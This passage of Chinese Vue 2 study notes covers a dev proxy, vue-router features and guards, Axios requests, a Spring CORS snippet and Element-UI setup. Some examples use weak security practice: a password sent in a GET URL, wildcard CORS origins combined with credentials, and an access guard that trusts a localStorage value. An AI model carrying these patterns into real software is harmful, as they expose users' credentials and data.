      },
      '/demo': {
        target: 'http://localhost:5001',
				pathRewrite:{'^/demo':''},
        // ws: true, //用于支持websocket
        // changeOrigin: true //用于控制请求头中的host值
      }
    }
  }
}
```

组件中发起请求

```vue
<template>
	<div>
		<button @click="getStudents">获取学生信息</button>
		<button @click="getCars">获取汽车信息</button>
	</div>
</template>

<script>
	import axios from 'axios'
	export default {
		name:'App',
		methods: {
			getStudents(){
				axios.get('http://localhost:8080/students').then(         // 不加前缀不走代理
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			},
			getCars(){
				axios.get('http://localhost:8080/demo/cars').then(  ///demo为前缀
					response => {
						console.log('请求成功了',response.data)
					},
					error => {
						console.log('请求失败了',error.message)
					}
				)
			}
		},
	}
</script>

```



## 路由

1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。

### 1.基本使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. main.js

   ```js
   //引入Vue
   import Vue from 'vue'
   //引入App
   import App from './App.vue'
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入路由器
   import router from './router'
   
   //关闭Vue的生产提示
   Vue.config.productionTip = false
   //应用插件
   Vue.use(VueRouter) 
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	router:router              //路由
   })
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

### 2.几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

### 3.多级路由（多级路由）

1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```vue
   <router-link to="/home/news">News</router-link>
   ```

示例

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231122200936282.png" alt="image-20231122200936282" style="zoom:67%;" />

router/index.js 路由

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		// 多级路由
		{
			path:'/home',
			component:Home,
			// 
			children:[
				{
					path:'news',  //此处一定不要写：/news
					component:News,
				},
				{
					path:'message',
					component:Message,
				}
			]
		}
	]
})

```

App.vue

```vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
						<!-- 指定组件的呈现位置 类似于插件-->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
	import Banner from './components/Banner'
	export default {
		name:'App',
		components:{Banner}
	}
</script>

```

路由组件通常存放在```pages```文件夹

![image-20231128210058546](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231128210058546.png)

运行效果

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231122201139356.png" alt="image-20231122201139356" style="zoom:67%;" />

### 4.路由的query参数

 @RequestParam()

1. 传递参数

   ```vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

例子

![image-20231201102458989](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231201102458989.png)

App.vue

```vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
						<!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
	import Banner from './components/Banner'
	export default {
		name:'App',
		components:{Banner}
	}
</script>

```

router/index.js

```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home,
			children:[
				{
					path:'news',
					component:News,
				},
				{
					path:'message',
					component:Message,
					//
					children:[
						{
							path:'detail',
							component:Detail,
						}
					]
				}
			]
		}
	]
})

```

pages/Message.vue

```vue
<template>
	<div>
		<ul>
			<li v-for="m in messageList" :key="m.id">
				<!-- 跳转路由并携带query参数，to的字符串写法 -->
				<!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp; -->

				<!-- 跳转路由并携带query参数，to的对象写法 
				传递参数给/home/message/detail路由所表示的组件
				-->
				<router-link :to="{
					path:'/home/message/detail',
					// 携带参数
					query:{
						id:m.id,
						title:m.title
					}
				}">
					{{m.title}}
				</router-link>
			
			</li>
		</ul>
		<hr>
		<!-- 展示区域 -->
		<router-view></router-view>  
	</div>
</template>

<script>
	export default {
		name:'Message',
		data() {
			return {
				messageList:[
					{id:'001',title:'消息001'},
					{id:'002',title:'消息002'},
					{id:'003',title:'消息003'}
				]
			}
		},
	}
</script>
```

pages/Detail.vue

```vue
<template>
	<ul>
		<!-- 接收参数 -->
		<li>消息编号：{{$route.query.id}}</li>
		<li>消息标题：{{$route.query.title}}</li>
	</ul>
</template>

<script>
	export default {
		name:'Detail',
		mounted() {
			console.log(this.$route)
		},
	}
</script>
```

…….

运行结果

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231201095900420.png" alt="image-20231201095900420" style="zoom:50%;" />

### 5.命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',         
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                          name:'hello' //给路由命名  //一般取path相同的名字//一级路由简化没有意义
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```vue
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```

### 6.路由的params参数

 @PathVariable()

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数 //动态路径参数以冒号开头
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```

例子

App.vue

```vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
						<!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
	import Banner from './components/Banner'
	export default {
		name:'App',
		components:{Banner}
	}
</script>
```

router/index.js

```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			name:'guanyu',
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home,
			children:[
				{
					path:'news',
					component:News,
				},
				{
					path:'message',
					component:Message,
					children:[
						{
							name:'xiangqing',
							path:'detail/:id/:title', //参数:id/:title
							component:Detail,
						}
					]
				}
			]
		}
	]
})
```

pages/Message.vue

```vue
<template>
	<div>
		<ul>
			<li v-for="m in messageList" :key="m.id">
				<!-- 跳转路由并携带params参数，to的字符串写法 -->
				<!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp; -->

				<!-- 跳转路由并携带params参数，to的对象写法 -->
				<router-link :to="{
					name:'xiangqing',  //必须用name
					params:{ //携带params参数
						id:m.id,
						title:m.title
					}
				}">
					{{m.title}}
				</router-link>
			
			</li>
		</ul>
		<hr>
		<router-view></router-view>
	</div>
</template>

<script>
	export default {
		name:'Message',
		data() {
			return {
				messageList:[
					{id:'001',title:'消息001'},
					{id:'002',title:'消息002'},
					{id:'003',title:'消息003'}
				]
			}
		},
	}
</script>
```

pages/Detail.vue

```vue
<template>
	<ul>
        <!-- 接收参数 -->
		<li>消息编号：{{$route.params.id}}</li>            
		<li>消息标题：{{$route.params.title}}</li>
	</ul>
</template>

<script>
	export default {
		name:'Detail',
		mounted() {
			// console.log(this.$route)
		},
	}
```

运行结果

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231201101413382.png" alt="image-20231201101413382" style="zoom:50%;" />

### 7.路由的props配置[query进级]

​	作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
} 
```





![image-20231201102352825](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231201102352825.png)

App.vue

```

```

index.js

```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			name:'guanyu',
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home,
			children:[
				{
					path:'news',
					component:News,
				},
				{
					path:'message',
					component:Message,
					children:[
						{
							name:'xiangqing',
							path:'detail',
							component:Detail,
							//props的第一种写法，值为对象，该对象中的所有key-value都会以props的形式传给Detail组件。
							// props:{a:1,b:'hello'}

							//props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件。
							// props:true

							//props的第三种写法，值为函数
							props($route){
								return {
									id:$route.query.id,
									title:$route.query.title,
									a:1,
									b:'hello'
								}
							}

						}
					]
				}
			]
		}
	]
})

```

Message.vue

```vue
<template>
	<div>
		<ul>
			<li v-for="m in messageList" :key="m.id">
				<!-- 跳转路由并携带params参数，to的字符串写法 -->
				<!-- <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp; -->
				<!-- 跳转路由并携带params参数，to的对象写法 -->
				<router-link :to="{
					name:'xiangqing',
					query:{              // 
						id:m.id,
						title:m.title
					}
				}">
					{{m.title}}
				</router-link>
			
			</li>
		</ul>
		<hr>
		<router-view></router-view>
	</div>
</template>

<script>
	export default {
		name:'Message',
		data() {
			return {
				messageList:[
					{id:'001',title:'消息001'},
					{id:'002',title:'消息002'},
					{id:'003',title:'消息003'}
				]
			}
		},
	}
</script>
```

Detail.vue

```vue
<template>
	<ul>
		<li>消息编号：{{id}}</li>
		<li>消息标题：{{title}}</li>
	</ul>
</template>

<script>
	export default {
		name:'Detail',
		props:['id','title'],
		computed: {
			// id(){
			// 	return this.$route.query.id
			// },
			// title(){
			// 	return this.$route.query.title
			// },
		},
		mounted() {
			// console.log(this.$route)
		},
	}
</script>
```



<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231201101852565.png" alt="image-20231201101852565" style="zoom:50%;" />



### 8.```<router-link>```的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```

### 9. 编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```

### 10.缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不销毁, 保留数据。

2. 具体编码：

   ```vue
   <!-- 缓存多个路由组件 -->
   <!-- <keep-alive :include="['News','Message']"> -->
   				
   <!-- 缓存一个路由组件, (保持活着), News必须是组件名 -->
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   ```

### 11.两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。

### 12.路由守卫

1. 作用：对路由进行权限控制(登录后才能看)
2. 分类：全局守卫、独享守卫、组件内守卫

![image-20231201134917426](vue%E7%AC%94%E8%AE%B02.0.assets/image-20231201134917426.png)

router/index.js

1. 全局守卫:

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   //全局前置路由守卫————初始化的时候被调用、每次路由切换之前被调用
   router.beforeEach((to,from,next)=>{
   	console.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   //全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用	// 可以用来切换网页标题
   router.afterEach((to,from)=>{
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title   //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
   ```

4. 独享守卫:

   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
   ```

5. 组件内守卫：

   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```



### 13.路由器的两种工作模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

## 使用Axios发送请求:crossed_swords:

### 使用 Axios

由于 Vue.js 是一个 视图层框架 并且作者（尤雨溪）严格准守 SoC （关注度分离原则），所以 Vue.js 并不包含 AJAX 的通信功能，为了解决通信问题，作者单独开发了一个名为 vue-resource 的插件，不过在进入 2.0 版本以后停止了对该插件的维护并推荐了 Axios 框架

#### 安装 vue axios

```bash
npm install --save axios vue-axios
```

#### main.js中引入

在项目中使用axios模块

```javascript
import Vue from 'vue'
import axios from 'axios'
import VueAxios from 'vue-axios'

Vue.use(VueAxios, axios)
```

####  发送ajax请求

```javascript
<template>
  <div id="app">
    <div style="width:50%" class="container">
      <div>
        <h3>Regist</h3>
        <h5>Email</h5>
        <input type="text" class="form-control" v-model="mail" /><br />
        {{mail}}
        <h5>Password</h5>
        <input type="password" class="form-control" v-model="password" /><br />
        {{password}}
        <h5>Gender</h5>
        <input type="radio" name="gender" v-model="gender" value="female" />男
        <input type="radio" name="gender" v-model="gender" value="male" />女<br />
        <h5>Hobby</h5>
        <input type="checkbox" name="hobby" v-model="hobby" value="music">音乐
        <input type="checkbox" name="hobby" v-model="hobby" value="movie">电影
        <input type="checkbox" name="hobby" v-model="hobby" value="sport">运动
        <br/>
        <button type="button" class="btn btn-success" @click="registfn">注册</button>
      </div>
    </div>
  </div>
</template>

<script>
  import MHeader from './components/Header'
export default {
  name: 'app',
  data(){
    return {
      mail:'',
      password:'',
      gender:'',
      hobby:''
    }
  },
  methods:{
    registfn:function(){
      this.axios({
        method:'get',
        url:'http://localhost:8090/regist?mail='+this.mail+'&password='+this.password,

      }).then(function (response) {
        console.log(response.data)
      });
    }
  }
}
</script>
```

#### 服务端解决跨域问题

```xml
<mvc:cors>  
    <mvc:mapping path="/"
        allowed-origins="*"
        allowed-methods="POST, GET, OPTIONS, DELETE, PUT,PATCH"
        allowed-headers="Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With"
        allow-credentials="true" />
</mvc:cors>
```

在spring-mvc.xml中加入上述这一段。其中，allowed-origins指的是允许的访问源的域名，"*"表示任何人都可以访问，也可以指明具体的域名

#### 解决axios无法传递data中的参数问题

原因：默认情况下发送axios时请求头中的内容类型为： （后端没有使用@RequestBody）

```xml
Content-Type:application/json;charset=UTF-8
```

而实际服务端需要的是：

```html
Content-Type:application/x-www-form-urlencoded
```

因此，使用axios的qs内置库中的方法进行内容类型的转换。

```javascript
import Qs from 'qs'

this.axios({
	method:'post',
	url:'http://localhost:8081/regist',
	transformRequest: [function (data) {
		return Qs.stringify(data)
	}],
	data:{
		email:this.email
	}
})
.then(function (response) {
	alert(response.data.message)
});
```

### 补充

在 Vue 3 中，通过 `createApp` 函数来创建 Vue 应用实例，而不再使用 `Vue.prototype` 来挂载属性。Vue 3 使用了 Composition API，可以使用 `provide` 和 `inject` 来在组件之间共享数据。

以下是将 Axios 实例和 HTTP URL 全局配置在 Vue 3 中的示例：

```
import { createApp } from 'vue';
import axios from 'axios';
import App from './App.vue';

// 创建一个 Axios 实例
const axiosInstance = axios.create({
  baseURL: 'http://localhost:8090',
  // 其他 Axios 配置
});

// 创建 Vue 应用实例
const app = createApp(App);

// 在 app 对象中提供 axios 实例和 httpUrl
app.provide('$axios', axiosInstance);
app.provide('$httpUrl', 'http://localhost:8090');

// 挂载到 #app 元素上
app.mount('#app');
```

在组件中，你可以通过 `inject` 来访问提供的数据：

```
javascriptCopy code// 在组件中使用提供的数据
export default {
  setup() {
    // 在 setup 函数中使用 inject 获取提供的数据
    const axiosInstance = inject('$axios');
    const httpUrl = inject('$httpUrl');

    // 然后在组件中可以使用 axiosInstance 和 httpUrl

    return {
      // 返回数据供模板使用
      axiosInstance,
      httpUrl,
    };
  },
};
```

请注意，在 Vue 3 中，`provide` 和 `inject` 是一对，子组件可以通过 `inject` 访问到父组件通过 `provide` 提供的数据。



在 Vue 2 中，你可以使用 `Vue.prototype` 来将 Axios 实例和 HTTP URL 挂载到 Vue 实例上，以便在整个应用中访问。以下是在 Vue 2 中的示例：

```
// main.js

import Vue from 'vue';
import App from './App.vue';
import axios from 'axios';

// 创建 Axios 实例
const axiosInstance = axios.create({
  baseURL: 'http://localhost:8090',
  // 其他 Axios 配置
});

// 挂载到 Vue 实例上
Vue.prototype.$axios = axiosInstance;
Vue.prototype.$httpUrl = 'http://localhost:8090';

Vue.config.productionTip = false;

new Vue({
  render: h => h(App),
}).$mount('#app');
```

在组件中，你可以通过 `this.$axios` 和 `this.$httpUrl` 来访问挂载在 Vue 实例上的数据：

```
javascriptCopy code// YourComponent.vue

export default {
  mounted() {
    // 在组件中使用 this.$axios 和 this.$httpUrl
    this.$axios.get('/api/data')
      .then(response => {
        // 处理响应数据
      })
      .catch(error => {
        // 处理错误
      });
      
    console.log(this.$httpUrl); // 输出 http://localhost:8090
  },
};
```







## Vue实战项目：Webpack登录验证后路由至列表页

------

| 对项目进行中的内容进行调整，结构如下：                       |
| ------------------------------------------------------------ |
| ![img](vue%E7%AC%94%E8%AE%B02.0.assets/1646014279806-f0138da8-93ea-4eb3-97bf-1a9d07905999.png) |



各部分内容：



#### 14.1 router路由模块： index.js（路由配置表）



```javascript
import Vue from 'vue'
import Router from 'vue-router'

import Login from '../views/Login'
import Home from '../views/Home'



// 安装路由
Vue.use(Router);

// 配置路由
export default new Router({
  routes: [
    {
      // 路由路径
      path: '/Login',
      // 路由名称
      name: 'Login',
      // 跳转到组件
      component: Login
    },
    {
      path:'/Home',
      name:'Home',
      component:Home
    }
  ]
});
```



#### 14.2 使用Element-UI组件库



##### 14.2.1 安装



在项目文件夹内使用命令来安装element-ui模块



```html
npm i element-ui -S
```



##### 14.2.2 使用



在vue项目中引入element-ui并使用。在 main.js 中写入以下内容：



```javascript
import Vue from 'vue';
import ElementUI from 'element-ui'; //加入
import 'element-ui/lib/theme-chalk/index.css';//加入
import App from './App.vue';

Vue.use(ElementUI);//加入

new Vue({
  el: '#app',
  render: h => h(App)
});
```

##### 14.2.3 在Element-UI组件库中查找组件

| 在官方组件库中，根据需求找到组件，然后在项目中使用。         |
| ------------------------------------------------------------ |
| ![img](vue%E7%AC%94%E8%AE%B02.0.assets/1646014318854-8782e08d-396b-42b4-820a-c01eefe7a4b2.png) |

#### 14.3 编写登录组件：Login.vue

```html
<template>
    <div class="login-box">
      <el-form ref="form" :model="form" :rules="rules" label-width="80px">
        <h3>欢迎登录</h3>
        <el-form-item label="用户名" prop="name">
          <el-input v-model="form.name" placeholder="请输入用户名"></el-input>
        </el-form-item>
        <el-form-item label="密码" prop="password">
          <el-input type="password" v-model="form.password" placeholder="请输入密码"></el-input>
        </el-form-item>
        <el-form-item>
          <el-button type="primary" @click="onSubmit('form')">登录</el-button>
        </el-form-item>
      </el-form>
    </div>
</template>

<script>
export default {
    name: "Login",
    data(){
      return{
        form:{
          name:'',
          password:''
        },
        rules:{
          name:[
            { required: true, message: '请输入用户名', trigger: 'blur' },
            { min: 6, max: 20, message: '长度在 6 到 20 个字符', trigger: 'blur' }
          ],
          password:[
            { required: true, message: '请输入密码', trigger: 'blur' },
            { min: 6, max: 20, message: '长度在 6 到 20 个字符', trigger: 'blur' }
          ]
        }
      }

    },
    methods:{
      onSubmit(formName){
        this.$refs[formName].validate((valid) => {
          var vm = this;
          if (valid) {
            // 发送axios请求
            this.axios({
              method:'post',
              url:'http://localhost:8090/login',
              data:{
                name:vm.form.name,
                password:vm.form.password
              }
            }).then(function(resp){
              // console.log(resp.data)
              if(resp.data.errno==0){

                //登录成功，要向vuex中存放user对象
                var user  = resp.data.data;
                vm.$store.dispatch('asyncUpdateUser', user);
                vm.$message({
                  message: '登录成功',
                  type: 'success'
                });
                setTimeout(function(){
                  vm.$router.push("/Home")
                },2000)
              }else{
                vm.$message.error('用户名或密码错误');
              }
            })

          } else {
            this.$message.error('用户名或密码格式错误');
            return false;
          }
        });
      }
    }
}
</script>

<style scoped>
  .login-box{
    width: 500px;
    height: 300px;
    border: 1px solid #DCDFE6;
    margin: 150px auto;
    padding: 20px 50px 20px 30px;
    border-radius: 20px;
    box-shadow: 0px 0px 20px #DCDFE6;
  }
</style>
```

输入的用户名和密码，通过Axios请求去后端做校验，若校验成功则路由至Home组件。

| 登录页面的展示效果：（Element UI）                           |
| ------------------------------------------------------------ |
| ![img](vue%E7%AC%94%E8%AE%B02.0.assets/1646014337833-bd075be6-69f6-4ca5-a0fa-1f7cf715f19a.png) |

#### 14.4 编写入口js：main.js

```javascript
import Vue from 'vue'
import App from './App'
import VueRouter from 'vue-router'
// 导入上面创建的路由配置表
import router from './router'

// 导入ElementUI模块
import ElementUI from 'element-ui';
import 'element-ui/lib/theme-chalk/index.css';
import axios from 'axios'
import VueAxios from 'vue-axios'

Vue.use(VueRouter);

// 使用ElementUI模块
Vue.use(ElementUI);
// 使用Axios （vue中实现ajax功能的组件）
Vue.use(VueAxios, axios)



Vue.config.productionTip = false

/* eslint-disable no-new */
new Vue({
  el: '#app',
  // 配置路由
  router,
  render: h => h(App)
})
```

## 第三方组件element-ui

### 1、什么是element-ui？

> element-ui是由饿了么前端团队推出的一套为开发者、设计师和产品经理准备的基于Vue.js 2.0的桌面组件库，而手机端有对应框架是 Mint UI 。整个ui风格简约，很实用，同时也极大的提高了开发者的效率，是一个非常受欢迎的组件库。

[官网地址](https://element.eleme.cn/#/zh-CN)

### 2、安装

推荐使用npm安装方式

```html
npm install element-ui -save
```

### 3、引入

全局引入，在vue入口main.js中增加内容如下

```html
import ElementUI from 'element-ui';



import 'element-ui/lib/theme-chalk/index.css';







Vue.use(ElementUI);
```

![img](vue%E7%AC%94%E8%AE%B02.0.assets/966ec276763d4b9593b4e822e7ae462d.png)

局部引入，在指定的vue文件中引入所需要的组件或主题样式，如下

```html
 import '@/style/theme/element-variables.scss'



 import { Message, MessageBox, Loading } from  'element-ui'



    Vue.use(Loading.directive) 



    Vue.prototype.$loading = Loading.service 



    Vue.prototype.$msgbox = MessageBox 



    Vue.prototype.$alert = MessageBox.alert 



    Vue.prototype.$confirm = MessageBox.confirm 



    Vue.prototype.$prompt = MessageBox.prompt 



    Vue.prototype.$message = Message
```

### 4、使用element-ui

打开官网，在组件里面选择要使用的代码直接cv大法

![img](vue%E7%AC%94%E8%AE%B02.0.assets/aa17bf06f36d47ac9de8fec9190e4238.png)



Hallow.vue代码

```html
<template>



<div>



    <el-table



    :data="tableData"



    style="width: 100%"



    :row-class-name="tableRowClassName">



    <el-table-column



      prop="date"



      label="日期"



      width="180">



    </el-table-column>



    <el-table-column



      prop="name"



      label="姓名"



      width="180">



    </el-table-column>



    <el-table-column



      prop="address"



      label="地址">



    </el-table-column>



  </el-table>



  <i class="fa fa-camera-retro fa-lg"></i> fa-lg



</div>



</template>







<!-- props 自定义属性,可以在外部使用自定义的名称，不需要导入的方式来进行套娃 -->



<script>



export default {



    name: "Hello",



    data: function(){



        return {



        tableData: [{



          date: '2016-05-02',



          name: '王小虎',



          address: '上海市普陀区金沙江路 1518 弄',



        }, {



          date: '2016-05-04',



          name: '王小虎',



          address: '上海市普陀区金沙江路 1518 弄'



        }, {



          date: '2016-05-01',



          name: '王小虎',



          address: '上海市普陀区金沙江路 1518 弄',



        }, {



          date: '2016-05-03',



          name: '王小虎',



          address: '上海市普陀区金沙江路 1518 弄'



        }]



      }



    },



    methods: {



      tableRowClassName({row, rowIndex}) {



        if (rowIndex === 1) {



          return 'warning-row';



        } else if (rowIndex === 3) {



          return 'success-row';



        }



        return '';



      }



    }



}



</script>







<style>



  .el-table .warning-row {



    background: oldlace;



  }







  .el-table .success-row {



    background: #f0f9eb;



  }



</style>
```

**效果**

